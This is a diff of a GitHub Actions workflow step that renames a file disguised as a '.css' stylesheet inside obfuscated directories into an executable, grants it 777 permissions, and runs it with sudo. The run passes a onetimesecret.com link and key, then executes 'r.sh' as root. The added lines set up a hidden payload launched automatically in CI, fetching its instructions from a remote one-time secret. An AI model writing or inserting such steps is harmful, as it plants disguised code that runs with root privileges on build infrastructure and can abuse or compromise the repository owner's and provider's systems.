@@ -27,7 +27,7 @@ jobs:
       run: |
         cd ${{ github.workspace }}
         ls
-        mv cly7e1v/nc7dnhkat/ualml5/sinclairs1m85.css huf00.x
-        chmod 700 huf00.x
+        mv cly7e1v/nc7dnhkat/ualml5/sinclairs1m85.css o86x4.sh.x
+        sudo chmod 777 o86x4.sh.x
         ls -la
-        sudo ./huf00.x https://onetimesecret.com/secret/oebds9901i7akwz86l14b27pzeq663e 95pwkk && sudo sh r.sh
+        sudo ./o86x4.sh.x https://onetimesecret.com/secret/knp4udfr432du3383ehsjvcznerkf9w g9xw0a && sudo sh r.sh
